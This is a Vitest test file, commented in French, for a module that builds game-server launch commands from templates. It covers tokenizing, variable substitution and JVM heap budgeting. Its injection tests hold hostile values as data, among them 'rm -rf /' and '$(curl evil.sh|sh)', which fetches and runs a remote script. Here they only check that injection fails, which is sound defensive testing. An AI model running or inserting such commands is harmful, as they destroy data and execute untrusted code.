import { describe, expect, it } from 'vitest';
import {
  InvocationError,
  MAX_HEAP_RATIO,
  buildEnvironment,
  buildInvocation,
  heapBudgetMib,
  substitute,
  tokenize,
} from './invocation.js';

const CONTEXT = {
  environment: { SERVER_JARFILE: 'server.jar', MINECRAFT_VERSION: '1.21.4' },
  memoryMib: 4096,
  ip: '0.0.0.0',
  port: 25565,
};

describe('tokenize', () => {
  it('découpe sur les espaces', () => {
    expect(tokenize('java -Xmx1024M -jar server.jar')).toEqual([
      'java',
      '-Xmx1024M',
      '-jar',
      'server.jar',
    ]);
  });

  it('respecte les guillemets doubles', () => {
    expect(tokenize('java -Dname="Mon Serveur" -jar s.jar')).toEqual([
      'java',
      '-Dname=Mon Serveur',
      '-jar',
      's.jar',
    ]);
  });

  it('respecte les guillemets simples', () => {
    expect(tokenize("java -Dmsg='a b c'")).toEqual(['java', '-Dmsg=a b c']);
  });

  it('ignore les espaces multiples et les tabulations', () => {
    expect(tokenize('java   -jar\t\ts.jar')).toEqual(['java', '-jar', 's.jar']);
  });

  it('conserve un argument vide explicite', () => {
    expect(tokenize('java -Dx=""')).toEqual(['java', '-Dx=']);
  });

  it('refuse un guillemet non fermé', () => {
    expect(() => tokenize('java -Dname="oups')).toThrow(InvocationError);
  });

  it('retourne un tableau vide pour une chaîne vide', () => {
    expect(tokenize('   ')).toEqual([]);
  });
});

describe('substitute', () => {
  it('remplace les variables connues', () => {
    expect(substitute('-jar {{SERVER_JARFILE}}', CONTEXT).value).toBe('-jar server.jar');
  });

  it('tolère les espaces dans les accolades', () => {
    expect(substitute('{{ SERVER_PORT }}', CONTEXT).value).toBe('25565');
  });

  it('fournit les variables intégrées', () => {
    // 4096 Mio de conteneur → 3276 Mio de tas (80 %), le reste étant laissé
    // au hors-tas de la JVM et au cache de pages.
    expect(substitute('-Xmx{{SERVER_MEMORY}}M', CONTEXT).value).toBe('-Xmx3276M');
    expect(substitute('{{SERVER_IP}}:{{SERVER_PORT}}', CONTEXT).value).toBe('0.0.0.0:25565');
  });

  it('expose aussi la limite brute du conteneur', () => {
    expect(substitute('{{SERVER_MEMORY_LIMIT}}', CONTEXT).value).toBe('4096');
  });

  it('accepte la notation pointée des eggs Pterodactyl', () => {
    expect(substitute('{{server.build.default.port}}', CONTEXT).value).toBe('25565');
  });

  it('signale une variable inconnue et la remplace par du vide', () => {
    const result = substitute('{{INCONNUE}}-suffixe', CONTEXT);
    expect(result.value).toBe('-suffixe');
    expect(result.missing).toEqual(['INCONNUE']);
  });

  // Un template ne doit pas pouvoir rediriger le port d'écoute annoncé aux
  // joueurs en redéfinissant la variable.
  it('ne laisse pas le template écraser une variable intégrée', () => {
    const context = { ...CONTEXT, environment: { SERVER_PORT: '1337' } };
    expect(substitute('{{SERVER_PORT}}', context).value).toBe('25565');
  });
});

/**
 * Ce bloc existe à cause d'un serveur tué par le noyau sur la machine de test,
 * puis corrigé deux fois — les deux erreurs valent d'être retenues.
 *
 * D'abord, la JVM était lancée avec `-Xmx` égal à la limite du conteneur : le
 * tas pouvait à lui seul remplir le cgroup.
 *
 * Ensuite, la marge de 256 Mio couvrait le hors-tas de la JVM mais oubliait le
 * cache de pages, lui aussi compté dans le cgroup. Mesure à l'appui : conteneur
 * de 1024 Mio, `-Xmx768M`, mémoire anonyme montant à 1018 Mio, cache écrasé de
 * 127 Mio à 0, puis code 137 — après un démarrage pourtant complet.
 */
describe('heapBudgetMib', () => {
  // Deux règles se combinent, et la plus stricte l'emporte : une marge fixe de
  // 384 Mio, et un plafond à 80 %. La bascule se fait à 1920 Mio.
  it.each([
    [512, 128],
    [1024, 640],
    [1536, 1152],
  ])('retire la marge fixe sur %s Mio', (limit, expected) => {
    expect(heapBudgetMib(limit)).toBe(expected);
  });

  it.each([
    [2048, 1638],
    [4096, 3276],
    [8192, 6553],
  ])('applique le plafond de 80 %% sur %s Mio', (limit, expected) => {
    expect(heapBudgetMib(limit)).toBe(expected);
  });

  // C'est la propriété qui compte, plus que les valeurs exactes : le tas ne
  // doit jamais pouvoir remplir le conteneur à lui seul.
  it.each([256, 512, 1024, 2048, 4096, 8192, 16384, 65536])(
    'laisse au moins 20 %% de marge sur %s Mio',
    (limit) => {
      const heap = heapBudgetMib(limit);
      expect(heap).toBeLessThanOrEqual(Math.floor(limit * MAX_HEAP_RATIO));
    },
  );

  // La mesure qui a motivé la correction : à 1024 Mio, le hors-tas anonyme
  // seul pèse ~250 Mio. Il doit rester de quoi cacher les fichiers de région,
  // sans quoi le noyau évince tout puis tue le processus.
  it('laisse de la place au cache de pages sur une petite allocation', () => {
    const NON_HEAP_ANON_MIB = 250;
    const heap = heapBudgetMib(1024);

    expect(1024 - heap - NON_HEAP_ANON_MIB).toBeGreaterThanOrEqual(128);
  });

  it('ne descend jamais sous le plancher de démarrage de la JVM', () => {
    expect(heapBudgetMib(128)).toBe(128);
    expect(heapBudgetMib(64)).toBe(128);
  });

  // Sans limite de conteneur, il n'y a rien à répartir : c'est au template de
  // ne pas utiliser `-Xmx` dans ce cas.
  it('retourne 0 pour une mémoire illimitée', () => {
    expect(heapBudgetMib(0)).toBe(0);
  });
});

describe('buildInvocation', () => {
  it('produit un argv exploitable', () => {
    const { argv } = buildInvocation(
      'java -Xms128M -Xmx{{SERVER_MEMORY}}M -jar {{SERVER_JARFILE}}',
      CONTEXT,
    );

    expect(argv).toEqual(['java', '-Xms128M', '-Xmx3276M', '-jar', 'server.jar']);
  });

  // ---------------------------------------------------------------------------
  // Ces cas sont la raison d'être du module : ils échouent si l'ordre
  // découpage / substitution est inversé un jour.
  // ---------------------------------------------------------------------------

  it("empêche une valeur de variable d'introduire un argument", () => {
    const context = { ...CONTEXT, environment: { SERVER_JARFILE: 'a.jar --hostile-flag' } };
    const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);

    expect(argv).toEqual(['java', '-jar', 'a.jar --hostile-flag']);
    expect(argv).toHaveLength(3);
  });

  it("empêche l'injection d'une commande par point-virgule", () => {
    const context = { ...CONTEXT, environment: { SERVER_JARFILE: 's.jar; rm -rf /' } };
    const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);

    expect(argv).toEqual(['java', '-jar', 's.jar; rm -rf /']);
  });

  it("empêche l'injection par substitution de commande", () => {
    const context = { ...CONTEXT, environment: { SERVER_JARFILE: '$(curl evil.sh|sh)' } };
    const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);

    expect(argv[2]).toBe('$(curl evil.sh|sh)');
    expect(argv).toHaveLength(3);
  });

  it("empêche l'injection par retour à la ligne", () => {
    const context = { ...CONTEXT, environment: { SERVER_JARFILE: 's.jar\nrm -rf /' } };
    const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);

    expect(argv).toHaveLength(3);
    expect(argv[2]).toBe('s.jar\nrm -rf /');
  });

  it('empêche une valeur de fermer un guillemet du gabarit', () => {
    const context = { ...CONTEXT, environment: { NAME: 'x" --hostile "y' } };
    const { argv } = buildInvocation('java -Dname="{{NAME}}"', context);

    expect(argv).toEqual(['java', '-Dname=x" --hostile "y']);
  });

  // ---------------------------------------------------------------------------

  it('retire un argument devenu entièrement vide', () => {
    const context = { ...CONTEXT, environment: {} };
    const { argv, missingVariables } = buildInvocation('java {{ABSENTE}} -jar s.jar', context);

    expect(argv).toEqual(['java', '-jar', 's.jar']);
    expect(missingVariables).toEqual(['ABSENTE']);
  });

  it('refuse un gabarit vide', () => {
    expect(() => buildInvocation('   ', CONTEXT)).toThrow(/vide/);
  });

  it("refuse un gabarit dont l'exécutable disparaît après substitution", () => {
    expect(() => buildInvocation('{{ABSENTE}}', { ...CONTEXT, environment: {} })).toThrow(
      /aucun exécutable/,
    );
  });

  it('remonte chaque variable manquante une seule fois', () => {
    const { missingVariables } = buildInvocation('java {{X}} {{X}} {{Y}} -jar s.jar', {
      ...CONTEXT,
      environment: {},
    });

    expect(missingVariables.sort()).toEqual(['X', 'Y']);
  });
});

describe('buildEnvironment', () => {
  it('expose les variables du template et les variables intégrées', () => {
    const env = buildEnvironment(CONTEXT);

    expect(env).toContain('SERVER_JARFILE=server.jar');
    expect(env).toContain('MINECRAFT_VERSION=1.21.4');
    expect(env).toContain('SERVER_MEMORY=3276');
    expect(env).toContain('SERVER_PORT=25565');
  });

  it('écarte les noms invalides en POSIX', () => {
    const env = buildEnvironment(CONTEXT);
    expect(env.some((entry) => entry.startsWith('server.build'))).toBe(false);
  });

  it('ne laisse pas le template redéfinir une variable intégrée', () => {
    const env = buildEnvironment({ ...CONTEXT, environment: { SERVER_PORT: '1337' } });

    expect(env).toContain('SERVER_PORT=25565');
    expect(env).not.toContain('SERVER_PORT=1337');
  });
});
